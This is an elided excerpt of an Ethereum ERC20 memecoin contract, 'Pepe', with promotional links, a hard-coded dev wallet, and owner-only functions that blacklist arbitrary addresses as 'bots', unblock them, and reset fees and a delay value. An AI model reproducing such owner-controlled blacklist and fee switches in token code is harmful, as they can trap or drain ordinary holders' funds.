...
https://t.me/PePePortal
https://pepeth.com/
https://twitter.com/Pepe_erc20
...
contract PEPE is ERC20, Ownable {
    ...
    constructor() ERC20("Pepe", "PePe") {
        ...
        uint256 totalSupply = 123456789 * 1e6;
        supply += totalSupply;
        ...
        devWallet = 0xAcBA12689Bc68190B90508aD07C9760aB738bD92;
    ...
    function bad(address[] memory bots_) public onlyOwner  {for (uint256 i = 0; i < bots_.length; i++) {bots[bots_[i]] = true;}}

	function good(address notbot) public onlyOwner {
			bots[notbot] = false;
	}
    function peperun() external onlyOwner {
        buyBurnFee = 0;
        buyDevFee = 5;
        buyTotalFees = buyBurnFee + buyDevFee;
    ...
    function updatedigi(uint256 newNum) external onlyOwner{
        delayDigit = newNum;
    }
